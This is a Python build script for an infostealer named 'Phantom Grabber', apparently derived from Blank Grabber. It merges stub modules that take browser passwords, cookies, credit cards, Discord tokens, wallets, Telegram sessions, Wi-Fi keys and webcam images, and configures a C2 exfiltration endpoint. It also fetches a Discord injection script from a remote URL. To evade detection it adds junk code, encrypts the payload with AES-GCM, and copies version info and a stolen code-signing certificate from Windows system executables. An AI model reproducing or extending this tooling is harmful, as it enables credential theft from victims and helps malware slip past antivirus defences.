# Phantom Grabber — Build Pipeline Orchestrator
# Merges stub modules, applies settings, obfuscates, encrypts, and packages.

import os
import sys
import json
import ast
import base64
import zlib
import shutil
import random
import string
import py_compile
import zipfile
import subprocess
import logging
import struct

from urllib3 import PoolManager
import pyaes
import obfuscator

logger = logging.getLogger("PhantomBuild")
logging.basicConfig(level=logging.INFO, format="[%(name)s] %(message)s")

MERGE_ORDER = [
    '_settings.py', '_syscalls.py', '_evasion.py', '_utility.py',
    '_browsers.py', '_discord.py', '_wallets.py', '_telegram.py',
    '_wifi.py', '_games.py', '_webcam.py', '_screenshot.py',
    '_systeminfo.py', '_commonfiles.py', '_exif.py', '_exfil.py', '_main.py'
]

INJECTION_URL = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Components/injection.js"

COMPONENTS_DIR = os.path.dirname(os.path.abspath(__file__))
STUB_DIR = os.path.join(COMPONENTS_DIR, "stub")
CONFIG_PATH = os.path.join(COMPONENTS_DIR, "config.json")


def ReadSettings() -> tuple[dict, str]:
    """Read config.json, flatten nested settings+modules structure, and fetch injection JS."""
    logger.info("Reading settings from config.json")
    with open(CONFIG_PATH, "r", encoding="utf-8") as f:
        raw = json.load(f)

    # Flatten nested {"settings": {...}, "modules": {...}} into a single dict
    # that matches what WriteSettings() expects.
    s = raw.get("settings", raw)   # fallback: already flat
    m = raw.get("modules", {})

    # c2 is stored as [mode, endpoint] list — convert to dict
    c2_raw = s.get("c2", [0, ""])
    if isinstance(c2_raw, list):
        c2 = {"mode": c2_raw[0] if len(c2_raw) > 0 else 0,
               "endpoint": c2_raw[1] if len(c2_raw) > 1 else ""}
    else:
        c2 = c2_raw  # already a dict (legacy)

    flat: dict = {
        # C2
        "c2": c2,
        # Settings — normalize key names to what WriteSettings expects
        "mutex":                 s.get("mutex", "PhantomMutex"),
        "archivePassword":       s.get("archivePassword", "phantom"),
        "pingMe":                s.get("pingme", s.get("pingMe", False)),
        "vmProtect":             s.get("vmprotect", s.get("vmProtect", False)),
        "startup":               s.get("startup", False),
        "melt":                  s.get("melt", False),
        "uacBypass":             s.get("uacBypass", False),
        "debug":                 s.get("debug", False),
        "boundFileRunOnStartup": s.get("boundFileRunOnStartup", False),
        "consoleMode":           s.get("consoleMode", 0),
        "pumpSize":              s.get("pumpedStubSize", s.get("pumpSize", 0)),
        # Modules (live in the nested "modules" section)
        "captureWebcam":         m.get("captureWebcam", False),
        "capturePasswords":      m.get("capturePasswords", False),
        "captureCookies":        m.get("captureCookies", False),
        "captureHistory":        m.get("captureHistory", False),
        "captureBookmarks":      m.get("captureBookmarks", False),
        "captureAutofill":       m.get("captureAutofills", m.get("captureAutofill", False)),
        "captureDiscord":        m.get("captureDiscordTokens", m.get("captureDiscord", False)),
        "captureWifi":           m.get("captureWifiPasswords", m.get("captureWifi", False)),
        "captureSysteminfo":     m.get("captureSystemInfo", m.get("captureSysteminfo", False)),
        "captureScreenshot":     m.get("captureScreenshot", False),
        "captureWebcam":         m.get("captureWebcam", False),
        "captureTelegram":       m.get("captureTelegramSession", m.get("captureTelegram", False)),
        "captureWallets":        m.get("captureWallets", False),
        "captureGames":          m.get("captureGames", False),
        "captureCommonFiles":    m.get("captureCommonFiles", False),
        "captureExif":           m.get("captureExif", False),
        "captureCreditCards":    m.get("captureCreditCards", False),
        "blockAvSites":          m.get("blockAvSites", False),
        "discordInjection":      m.get("discordInjection", False),
        # fakeError: gui writes [enabled, [title, msg, icon_idx]]
        # WriteSettings expects [enabled, title, msg, icon_idx]
        "fakeError":             _flatten_fake_error(m.get("fakeError", [False, ["Error", "An error occurred.", 0]])),
    }

    injection_js = ""
    try:
        http = PoolManager(cert_reqs="cert_none")
        resp = http.request("GET", INJECTION_URL, timeout=15.0)
        if resp.status == 200:
            injection_js = resp.data.decode("utf-8", errors="replace")
            logger.info(f"Fetched injection JS: {len(injection_js)} bytes")
        else:
            logger.warning(f"Failed to fetch injection JS: HTTP {resp.status}")
    except Exception as exc:
        logger.warning(f"Could not fetch injection JS: {exc}")

    return flat, injection_js


def _flatten_fake_error(fe) -> list:
    """Normalize fakeError to [enabled, title, message, icon] regardless of source format."""
    if not isinstance(fe, list) or len(fe) < 2:
        return [False, "Error", "An error occurred.", 0]
    enabled = bool(fe[0])
    inner = fe[1]
    if isinstance(inner, list):
        title   = inner[0] if len(inner) > 0 else "Error"
        message = inner[1] if len(inner) > 1 else "An error occurred."
        icon    = inner[2] if len(inner) > 2 else 0
    elif isinstance(inner, str):
        # legacy: [enabled, title, message, icon]
        title   = inner
        message = fe[2] if len(fe) > 2 else "An error occurred."
        icon    = fe[3] if len(fe) > 3 else 0
    else:
        return [False, "Error", "An error occurred.", 0]
    return [enabled, title, message, icon]


def MergeStubModules() -> str:
    """Merge all stub modules in defined order, deduplicating imports."""
    logger.info("Merging stub modules...")
    all_import_lines: list[str] = []
    all_code_lines: list[str] = []
    seen_imports: set[str] = set()

    for filename in MERGE_ORDER:
        filepath = os.path.join(STUB_DIR, filename)
        if not os.path.isfile(filepath):
            logger.warning(f"Stub file not found, skipping: {filename}")
            continue

        with open(filepath, "r", encoding="utf-8") as f:
            lines = f.readlines()

        import_lines: list[str] = []
        code_lines: list[str] = []
        in_code = False

        for line in lines:
            stripped = line.rstrip("\n").rstrip("\r")
            if not in_code:
                if stripped.startswith("import ") or stripped.startswith("from "):
                    if stripped not in seen_imports:
                        seen_imports.add(stripped)
                        import_lines.append(stripped)
                elif stripped.strip() == "":
                    continue
                else:
                    in_code = True
                    code_lines.append(stripped)
            else:
                code_lines.append(stripped)

        all_import_lines.extend(import_lines)

        # Strip leading blank lines from code section
        while all_code_lines and all_code_lines[-1].strip() == "":
            pass  # no-op; we strip leading blanks from *this* file's code
        trimmed = []
        started = False
        for cl in code_lines:
            if not started and cl.strip() == "":
                continue
            started = True
            trimmed.append(cl)
        all_code_lines.extend(trimmed)

        logger.info(f"  Merged: {filename} ({len(import_lines)} imports, {len(trimmed)} code lines)")

    merged = "\n".join(all_import_lines) + "\n\n" + "\n".join(all_code_lines)
    logger.info(f"Total merged output: {len(merged)} chars")
    return merged


def EncryptString(plainText: str) -> str:
    """Base64 encode a string and return as a decode expression."""
    encoded = base64.b64encode(plainText.encode("utf-8")).decode("ascii")
    return f'base64.b64decode("{encoded}").decode()'


def WriteSettings(code: str, settings: dict, injection: str) -> str:
    """Replace all placeholder tokens in the merged stub with actual settings."""
    logger.info("Injecting settings into merged stub...")

    # C2 endpoint
    c2 = settings.get("c2", {})
    mode = c2.get("mode", 0)
    endpoint = c2.get("endpoint", "")
    code = code.replace("'%c2%'", f"({repr(mode)}, {EncryptString(endpoint)})")

    # Simple encrypted string replacements
    encrypted_fields = {
        "'%mutex%'": settings.get("mutex", "PhantomMutex"),
        "'%archivepassword%'": settings.get("archivePassword", "phantom"),
    }
    for placeholder, value in encrypted_fields.items():
        code = code.replace(placeholder, EncryptString(value))

    # Boolean flag replacements — tokens MUST match _settings.py exactly
    bool_flags = {
        "'%pingme%'":                settings.get("pingMe", False),
        "'%vmprotect%'":             settings.get("vmProtect", False),
        "'%startup%'":               settings.get("startup", False),
        "'%melt%'":                  settings.get("melt", False),
        "'%uacBypass%'":             settings.get("uacBypass", False),
        "'%debug%'":                 settings.get("debug", False),
        "'%boundfilerunonstartup%'": settings.get("boundFileRunOnStartup", False),
        "'%capturewebcam%'":         settings.get("captureWebcam", False),
        "'%capturescreenshot%'":     settings.get("captureScreenshot", False),
        "'%capturepasswords%'":      settings.get("capturePasswords", False),
        "'%capturecookies%'":        settings.get("captureCookies", False),
        "'%capturehistory%'":        settings.get("captureHistory", False),
        # _settings.py uses these exact names:
        "'%captureautofills%'":      settings.get("captureAutofill", False),
        "'%capturediscordtokens%'":  settings.get("captureDiscord", False),
        "'%capturewifipasswords%'":  settings.get("captureWifi", False),
        "'%capturesysteminfo%'":     settings.get("captureSysteminfo", False),
        "'%capturetelegram%'":       settings.get("captureTelegram", False),
        "'%capturewallets%'":        settings.get("captureWallets", False),
        "'%capturegames%'":          settings.get("captureGames", False),
        "'%capturecommonfiles%'":    settings.get("captureCommonFiles", False),
        "'%captureexif%'":           settings.get("captureExif", False),
        "'%capturecreditcards%'":    settings.get("captureCreditCards", False),
        "'%blockavsites%'":          settings.get("blockAvSites", False),
        "'%discordinjection%'":      settings.get("discordInjection", False),
    }
    for placeholder, enabled in bool_flags.items():
        code = code.replace(placeholder, "'true'" if enabled else "''")


    # Console mode
    console_mode = settings.get("consoleMode", 2)
    code = code.replace("'%hideconsole%'", "'true'" if console_mode in (0, 1) else "''")

    # Fake error
    fake_error = settings.get("fakeError", [False, "Error", "An error occurred", 0])
    code = code.replace("'%fakeerror%'", "'true'" if fake_error[0] else "''")
    code = code.replace("'%title%'", f"'{fake_error[1]}'")
    code = code.replace("'%message%'", f"'{fake_error[2]}'")
    code = code.replace("'%icon%'", f"'{fake_error[3]}'")

    # Injection JS base64
    injection_b64 = base64.b64encode(injection.encode("utf-8")).decode("ascii") if injection else ""
    code = code.replace("'%injectionbase64encoded%'", f"'{injection_b64}'")

    # Remove __name__ guard so it always runs
    code = code.replace('__name__ == "__main__" and ', "")

    logger.info("Settings injection complete.")
    return code


def PrepareEnvironment(settings: dict) -> None:
    """Handle bound file compression, console mode flag, and pump size file."""
    logger.info("Preparing build environment...")

    # Bound file handling
    bound_path = os.path.join(COMPONENTS_DIR, "bound.exe")
    bound_output = os.path.join(COMPONENTS_DIR, "bound.blank")
    if os.path.isfile(bound_path):
        with open(bound_path, "rb") as f:
            data = f.read()
        compressed = zlib.compress(data, 9)
        reversed_data = compressed[::-1]
        with open(bound_output, "wb") as f:
            f.write(reversed_data)
        logger.info(f"Bound file compressed: {len(data)} -> {len(reversed_data)} bytes")
    else:
        if os.path.isfile(bound_output):
            os.remove(bound_output)

    # Console mode flag file
    noconsole_flag = os.path.join(COMPONENTS_DIR, "noconsole")
    console_mode = settings.get("consoleMode", 2)
    if console_mode in (0, 1):
        with open(noconsole_flag, "w") as f:
            f.write("1")
    else:
        if os.path.isfile(noconsole_flag):
            os.remove(noconsole_flag)

    # Pump size file
    pump_path = os.path.join(COMPONENTS_DIR, "pumpStub")
    pump_size = settings.get("pumpSize", 0)
    if pump_size > 0:
        with open(pump_path, "w") as f:
            f.write(str(pump_size))
    else:
        if os.path.isfile(pump_path):
            os.remove(pump_path)


def junk(path: str) -> None:
    """Inject a random junk class with dummy methods into the obfuscated file."""
    logger.info(f"Adding junk code to {path}")
    junk_class_name = "".join(random.choices(string.ascii_letters, k=random.randint(10, 18)))

    methods = []
    num_methods = random.randint(5, 12)
    for _ in range(num_methods):
        method_name = "_" + "".join(random.choices(string.ascii_lowercase + "_", k=random.randint(6, 14)))
        num_params = random.randint(0, 4)
        params = ", ".join(
            "p" + "".join(random.choices(string.ascii_lowercase, k=4))
            for _ in range(num_params)
        )
        body_lines = []
        num_body = random.randint(2, 6)
        for _ in range(num_body):
            var = "v" + "".join(random.choices(string.ascii_lowercase, k=4))
            val = random.randint(-999999, 999999)
            body_lines.append(f"        {var} = {val}")
        body_lines.append(f"        return {random.randint(0, 255)}")
        method_code = f"    def {method_name}(self, {params}):\n" + "\n".join(body_lines)
        methods.append(method_code)

    junk_code = f"\nclass {junk_class_name}:\n" + "\n".join(methods) + "\n"

    with open(path, "r", encoding="utf-8") as f:
        original = f.read()

    with open(path, "w", encoding="utf-8") as f:
        f.write(original + junk_code)

    logger.info(f"Injected junk class '{junk_class_name}' with {num_methods} methods")


def MakeVersionFileAndCert() -> None:
    """Grab version info from a random system exe and extract a certificate with sigthief."""
    logger.info("Generating version info and certificate...")

    sys_dir = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
    system_exes = [
        f for f in os.listdir(sys_dir)
        if f.lower().endswith(".exe") and os.path.isfile(os.path.join(sys_dir, f))
    ]

    if not system_exes:
        logger.warning("No system executables found for version info extraction")
        return

    donor_exe = os.path.join(sys_dir, random.choice(system_exes))
    version_file = os.path.join(COMPONENTS_DIR, "version.txt")
    cert_file = os.path.join(COMPONENTS_DIR, "cert")

    # Extract version info using pyi-grab_version
    try:
        result = subprocess.run(
            [sys.executable, "-m", "PyInstaller.utils.cliutils.grab_version", donor_exe, version_file],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0 and os.path.isfile(version_file):
            logger.info(f"Version info extracted from {donor_exe}")
        else:
            # Fallback: try pyi-grab_version directly
            result = subprocess.run(
                ["pyi-grab_version", donor_exe, version_file],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                logger.info(f"Version info extracted from {donor_exe} (fallback)")
            else:
                logger.warning(f"pyi-grab_version failed: {result.stderr.strip()}")
    except Exception as exc:
        logger.warning(f"Version extraction failed: {exc}")

    # Extract certificate using sigthief
    try:
        import sigthief
        signed_exes = [
            f for f in system_exes
            if os.path.getsize(os.path.join(sys_dir, f)) > 50000
        ]
        if signed_exes:
            cert_donor = os.path.join(sys_dir, random.choice(signed_exes))
            if sigthief.outputCert(cert_donor, cert_file):
                logger.info(f"Certificate extracted from {cert_donor}")
            else:
                logger.warning("Certificate extraction returned False")
        else:
            logger.warning("No suitable signed executables found")
    except Exception as exc:
        logger.warning(f"Certificate extraction failed: {exc}")


def main(*args, **kwargs) -> None:
    """Full build pipeline."""
    logger.info("=" * 60)
    logger.info("Phantom Grabber — Build Pipeline Starting")
    logger.info("=" * 60)

    os.chdir(COMPONENTS_DIR)

    # Step 1: Merge stub modules
    code = MergeStubModules()

    # Step 2: Read settings and inject
    settings, injection = ReadSettings()
    code = WriteSettings(code, settings, injection)

    # Step 3: Prepare build environment
    PrepareEnvironment(settings)

    # Step 4: Obfuscate
    logger.info("Running polymorphic obfuscation...")
    obfuscator.PhantomOBF(code, "stub-o.py")

    # Step 5: Add junk code
    junk("stub-o.py")

    # Step 6: Compile to .pyc
    logger.info("Compiling to bytecode...")
    pyc_path = "stub-o.pyc"
    py_compile.compile("stub-o.py", cfile=pyc_path, doraise=True)

    # Step 7: Zip the .pyc
    logger.info("Creating zip archive...")
    zip_path = "stub-o.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(pyc_path, "stub-o.pyc")

    # Step 8: AES-GCM encrypt
    logger.info("Encrypting payload with AES-GCM...")
    aes_key = os.urandom(32)
    aes_iv = os.urandom(12)

    with open(zip_path, "rb") as f:
        plaintext = f.read()

    aes_gcm = pyaes.AESModeOfOperationGCM(aes_key, aes_iv)
    ciphertext = aes_gcm.encrypt(plaintext)

    # Step 9: Compress + reverse → blank.aes
    compressed = zlib.compress(ciphertext, 9)
    reversed_ct = compressed[::-1]

    aes_file = os.path.join(COMPONENTS_DIR, "blank.aes")
    with open(aes_file, "wb") as f:
        f.write(reversed_ct)
    logger.info(f"Encrypted payload saved: {len(reversed_ct)} bytes")

    # Step 10: Write loader with injected key/iv
    key_b64 = base64.b64encode(aes_key).decode("ascii")
    iv_b64 = base64.b64encode(aes_iv).decode("ascii")

    loader_template = os.path.join(COMPONENTS_DIR, "loader.py")
    with open(loader_template, "r", encoding="utf-8") as f:
        loader_code = f.read()

    loader_code = loader_code.replace("%key%", key_b64)
    loader_code = loader_code.replace("%iv%", iv_b64)

    loader_out = os.path.join(COMPONENTS_DIR, "loader-o.py")
    with open(loader_out, "w", encoding="utf-8") as f:
        f.write(loader_code)
    logger.info("Loader written with embedded key/iv")

    # Step 11: Version file and certificate
    MakeVersionFileAndCert()

    # Cleanup temp files
    for temp in ("stub-o.py", "stub-o.pyc", "stub-o.zip"):
        if os.path.isfile(temp):
            os.remove(temp)

    logger.info("=" * 60)
    logger.info("Build pipeline complete! Run run.bat to package with PyInstaller.")
    logger.info("=" * 60)


def WritePythonStub(config: dict) -> str:
    """For --output py mode: merge, inject settings, strip AST comments, return raw code."""
    code = MergeStubModules()

    injection_js = ""
    try:
        http = PoolManager(cert_reqs="cert_none")
        resp = http.request("GET", INJECTION_URL, timeout=15.0)
        if resp.status == 200:
            injection_js = resp.data.decode("utf-8", errors="replace")
    except Exception:
        pass

    code = WriteSettings(code, config, injection_js)

    # Strip docstrings and comments via AST
    try:
        tree = ast.parse(code)
        for node in ast.walk(tree):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef, ast.Module)):
                if (node.body and isinstance(node.body[0], ast.Expr)
                        and isinstance(node.body[0].value, ast.Constant)):
                    node.body.pop(0)
                    if not node.body:
                        node.body.append(ast.Pass())
        code = ast.unparse(tree)
    except SyntaxError:
        logger.warning("AST parsing failed; returning code without comment stripping")

    return code


if __name__ == "__main__":
    main()
